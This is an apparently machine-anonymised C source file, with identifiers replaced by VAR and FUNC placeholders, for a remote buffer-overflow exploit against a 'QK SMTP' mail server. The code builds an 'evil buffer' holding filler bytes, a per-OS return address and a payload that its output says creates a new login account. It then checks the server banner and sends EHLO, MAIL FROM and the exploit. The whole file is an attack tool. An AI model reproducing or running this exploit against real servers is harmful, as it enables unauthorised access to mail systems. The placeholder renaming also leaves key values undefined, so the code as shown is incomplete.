
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* platform; char addr; } ;


 int VAR_0 ;
 char* VAR_1 ;
 char* VAR_2 ;
 int VAR_3 ;
 char* VAR_4 ;
 int VAR_5 ;
 char* VAR_6 ;
 char* VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 char* VAR_11 ;
 size_t FUNC_0 (char*) ;
 int FUNC_1 () ;
 int FUNC_2 (int) ;
 int FUNC_3 (char*,char*,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ) ;
 int FUNC_6 (char*) ;
 char* VAR_12 ;
 scalar_t__ FUNC_7 (int) ;
 int FUNC_8 (char*,char*,int) ;
 int FUNC_9 (char*,int,int) ;
 int FUNC_10 (char*,...) ;
 unsigned int FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (char*,size_t) ;
 scalar_t__ FUNC_13 (int,char*,int,int ) ;
 int FUNC_14 (int) ;
 int FUNC_15 (char*,char*,char*,...) ;
 int VAR_13 ;
 int FUNC_16 (char*) ;
 scalar_t__ FUNC_17 (char*,char*) ;
 TYPE_1__* VAR_14 ;
 int FUNC_18 (char*) ;

int FUNC_19(int VAR_15, char *VAR_16[]) {
    int VAR_17,VAR_18;
    char VAR_19[VAR_5];
    char VAR_20[VAR_5];
    unsigned int VAR_21;
    char *VAR_22,*VAR_23;
    char VAR_24[256];
    char VAR_25[VAR_9];
    FUNC_1();
    if( (VAR_15 != 4) || (FUNC_0(VAR_16[2]) < 1) || (FUNC_0(VAR_16[2]) > 65534) )
        FUNC_18(VAR_16[0]);
    FUNC_10("[+] Target OS is: %s\n",VAR_14[FUNC_0(VAR_16[3])].platform);
    FUNC_10("[+] Creating evil buffer...");
    FUNC_5(VAR_13);
    VAR_22 = (char *) FUNC_7(VAR_0);
    VAR_23 = (char *) FUNC_7(VAR_0 + FUNC_16(VAR_1));
    FUNC_9(VAR_22,0x73,VAR_0);
    FUNC_9(VAR_22+4000,0x45,1000);
    FUNC_3(VAR_19,VAR_7,FUNC_16(VAR_7));
    FUNC_3(VAR_20,VAR_6,FUNC_16(VAR_6));
    FUNC_15(VAR_25,VAR_11,VAR_19,VAR_20,VAR_19);
    FUNC_8(VAR_22+VAR_8,&VAR_14[FUNC_0(VAR_16[3])].addr,4);
    FUNC_8(VAR_22+VAR_10,VAR_25,FUNC_16(VAR_25));
    FUNC_8(VAR_22+VAR_3,VAR_12,FUNC_16(VAR_12));
    FUNC_9(VAR_22+4500,0x00,1);
    FUNC_10("done\n");
    FUNC_10("[+] Connecting to remote host\n");
    VAR_17 = FUNC_12(VAR_16[1],FUNC_0(VAR_16[2]));

    if((VAR_21 = FUNC_11(VAR_17,VAR_24,256,0)) < 0)
    {
     FUNC_10("\n[X] Error while recieving banner!\n");
     FUNC_4( 1 );
    }
    if (FUNC_17(VAR_24,"QK SMTP")!=0)
    {
     FUNC_14(1);
     FUNC_15(VAR_23,"%s",VAR_2);
     FUNC_10("[+] Sending EHLO\n");
     if ( FUNC_13 ( VAR_17, VAR_23, FUNC_16(VAR_23), 0) <= 0 )
     {
            FUNC_10("[X] Failed to send buffer\n");
            FUNC_4 ( 1 );
     }
     FUNC_14(1);
     FUNC_15(VAR_23,"%s",VAR_4);
     FUNC_10("[+] Sending MAIL FROM\n");
     if ( FUNC_13 ( VAR_17, VAR_23, FUNC_16(VAR_23), 0) <= 0 )
     {
            FUNC_10("[X] Failed to send buffer\n");
            FUNC_4 ( 1 );
     }
     FUNC_14(1);
     FUNC_15(VAR_23,VAR_1,VAR_22);
     FUNC_10("[+] Sending EXPLOIT\n");
     if ( FUNC_13 ( VAR_17, VAR_23, FUNC_16(VAR_23), 0) <= 0 )
     {
            FUNC_10("[X] Failed to send buffer\n");
            FUNC_4 ( 1 );
     }
     FUNC_14(1);
     FUNC_10("[+] Done - New account should have been added:\n");
     FUNC_10("[i] LOGIN:\t%s\n",VAR_7);
     FUNC_10("[i] PASSWORD:\t%s\n",VAR_6);
     FUNC_10("[+] Exploit now hangs up. see ya.\n\n");
    } else
     FUNC_10("[X] This server is not running QK SMTP\n");
    FUNC_2(VAR_17);
    FUNC_6(VAR_22);
    FUNC_6(VAR_23);
    return 0;
}
